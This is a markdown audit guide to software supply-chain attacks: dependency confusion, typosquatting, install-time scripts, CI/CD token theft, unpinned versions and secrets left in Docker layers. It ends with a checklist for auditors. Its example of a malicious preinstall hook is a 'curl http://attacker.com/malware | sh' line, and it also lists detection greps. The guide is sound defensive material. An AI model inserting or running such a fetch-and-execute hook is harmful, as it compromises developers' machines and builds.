# Supply Chain Security — Tactical Pillar

> **Context:** Modern applications depend on thousands of external packages. Attackers target the developer or the build environment to inject malicious code before it ever reaches the application repo.

---

## 1. Dependency Confusion
Occurs when a project uses internal/private package names that are not registered on public registries like NPM or PyPI.
- **Tactic:** Attacker registers the same name on the public registry with a higher version number. The package manager (npm, pip) defaults to the highest version available.
- **Audit Requirement:**
  - Check for internal naming patterns (e.g. `@company-internal/utils`).
  - Verify if `npmrc` or `pip.conf` restricts registries for specific scopes.
- **`grep_search`:** `package.json`, `requirements.txt`, `@internal`, `--extra-index-url`.

---

## 2. Typosquatting
Malicious packages with names similar to popular ones.
- **Example:** `requesst` instead of `requests`, `pythone-dateutil` instead of `python-dateutil`.
- **`grep_search`:** Read dependency manifests and mentally verify spelling against known standards.

---

## 3. Malicious Lifecyle Scripts
NPM and other package managers allow executing scripts during installation (`preinstall`, `postinstall`).
- **Tactic:** A compromised package includes a `preinstall` script that executes `curl http://attacker.com/malware | sh`.
- **`grep_search`:** `grep -r "preinstall" package.json`. Read the scripts and check for network requests or obfuscated code.

---

## 4. CI/CD Pipeline Hijacking
If an attacker exploits a code flaw (like a GitHub Actions script injection), they can modify the build process.
- **Tactic:** Steal `GITHUB_TOKEN` or `NPM_TOKEN` from environment variables to publish malicious versions of the software.
- **`grep_search`:** `${{ github.event.issue.title }}`, `${{ github.head_ref }}` used in `run:` steps.

---

## 5. Unpinned Dependencies
Using floating versions (e.g. `express: "^4.17.1"`) depends on the registry "not being compromised" tomorrow.
- **Elite Requirement:** Full pinning of exact versions or use of Lockfiles (`package-lock.json`, `poetry.lock`, `Gemfile.lock`).
- **Audit:** Search for the absence of lockfiles in the repository.

---

## 6. Secrets in Build Artifacts
Leakage of keys in Docker layers or frontend maps.
- **Tactic:** Download the final Docker image and inspect `history` or mount layers to find `.env` files copied early then deleted (still in layers).
- **`grep_search`:** `COPY . .` in Dockerfile without `.dockerignore`.

---

## Strategic Checklist for Auditor
1. [ ] Check if `package-lock.json` or equivalent exists.
2. [ ] Scan `package.json` for suspicious lifecycle scripts.
3. [ ] Verify if internal packages are properly scoped.
4. [ ] Audit CI/CD workflows for script injection sinks.
5. [ ] Check `.dockerignore` content.

---

*Tags: #supply-chain #dependency-confusion #npm-security #shiva-vault*
